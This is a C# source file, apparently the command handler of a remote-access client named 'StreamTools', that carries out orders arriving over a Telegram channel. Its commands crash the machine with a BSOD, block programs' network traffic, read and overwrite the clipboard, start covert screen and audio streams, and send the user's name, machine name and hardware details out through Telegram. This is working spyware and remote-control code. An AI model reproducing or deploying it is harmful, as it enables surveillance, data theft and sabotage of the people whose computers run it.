using StreamTools.Other;
using System;
using System.Collections.Generic;
using System.Data;
using System.Linq;
using System.Runtime.Remoting.Contexts;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace StreamTools
{
    public class ClientAPI
    {
        public ClientAPI() { }

        public void completeTask(string task, bool logging=true) {
            try {
                if (task == "None")
                    return;

                DataStorage.anwserToPacket = false;
                if (logging)
                    Requests.send_tgmsg("StreamToolsClient recived api task.");
                string forswitch = task.Contains(' ') ? task.Split(' ')[0] : task;
                switch (forswitch)
                {
                    case "bsod":
                        Requests.send_tgmsg("Bye-bye...");
                        WinAPI.BSOD();
                        break;
                    case "traffic_block":
                        string tb_path = task.Split(' ')[1].Replace("/", "\\");
                        string tb_exe_name = tb_path.Split('\\')[tb_path.Split('\\').Length - 1];
                        if (tb_path == "steam")
                            tb_path = "C:\\Program Files (x86)\\Steam\\bin\\cef\\cef.win7x64\\steamwebhelper.exe";
    
                        TrafficManager.setTraffic(tb_path, true);
                        Requests.send_tgmsg($"Success blocked traffic for: {tb_exe_name}");
                        break;
                    case "traffic_unblock":
                        string tu_path = task.Split(' ')[1].Replace("/", "\\");
                        string tu_exe_name = tu_path.Split('\\')[tu_path.Split('\\').Length - 1];
                        if (tu_path == "steam")
                            tu_path = "C:\\Program Files (x86)\\Steam\\bin\\cef\\cef.win7x64\\steamwebhelper.exe";

                        TrafficManager.setTraffic(tu_path, false);
                        Requests.send_tgmsg($"Success unblocked traffic for: {tu_exe_name}");
                        break;
                    case "clipboard_get":
                        Requests.send_tgmsg("Clipboard:\n" + Clipboard.GetText());
                        break;
                    case "clipboard_set":
                        Clipboard.SetText(task.Replace("clipboard_set ", ""));
                        Requests.send_tgmsg("Success");
                        break;
                    case "stream_start":
                        streamStart();
                        Requests.send_tgmsg("Stream started");
                        break;
                    case "stream_stop":
                        streamStop();
                        Requests.send_tgmsg("Stream stopped");
                        break;
                    case "stream_restart":
                        completeTask("stream_stop", false);
                        completeTask("stream_start", false);
                        break;
                    case "audio_get":
                        Requests.send_tgmsg($"Audio input list (microphone):\n{DataStorage.cameraService.ReciveMicrophoneList()}\nAudio output list (headphones):\n{DataStorage.cameraService.ReciveHeadphonesList()}");
                        break;
                    case "update_cfg":
                        DataStorage.cfgManager.updateConfig();
                        Requests.send_tgmsg($"New config:\naudioVolume = {DataStorage.audioVolume}\naudioBiterate = {DataStorage.biterateAudio}\nvideoBiterate = {DataStorage.biterateVideo}\nvideoFps = {DataStorage.fpsVideo}\naudioId = {DataStorage.audioId}\ninputAudioId = {DataStorage.inputAudioId}");
                        break;
                    case "client_info":
                        string ffmpegpid = DataStorage.shareService.getProcess() != null ? DataStorage.shareService.getProcess().Id.ToString() : "NULL";
                        Requests.send_tgmsg(
                            "[user]\n" +
                            $"Username: {Environment.UserName}" + "\n" +
                            $"PC name: {Environment.MachineName}" + "\n" +
                            $"OS version: {Environment.OSVersion}" + "\n" +
                            $"AFK: {DataStorage.isAFK.ToString()}" + "\n" +
                            "\n" +
                            "[pc]\n" +
                            $"CPU: {PCInformation.cpu}" + "\n" +
                            $"GPU: {PCInformation.gpu}" + "\n" +
                            $"Memory: {ByteManager.GetFileSizeString(long.Parse(PCInformation.ram))}" + "\n" +
                            $"Drives: {PCInformation.hdd}" + "\n" +
                            "\n" +
                            "[process]\n" +
                            $"ffmpeg pid: {ffmpegpid}" + "\n" +
                            $"streamtools pid: {System.Diagnostics.Process.GetCurrentProcess().Id}"
                        );
                        break;
                }
                DataStorage.anwserToPacket = true;
            } catch { Requests.send_tgmsg("StreamToolsClient failed to complete cmd!"); DataStorage.anwserToPacket = true; }
        }

        private static void streamStart()
        {
            DataStorage.shareService.StartStreaming();
        }

        private static void streamStop()
        {
            DataStorage.shareService.StopStreaming();
        }

        private static void setAudioDevice(int id)
        {
            DataStorage.audioId = id;
        }
    }
}
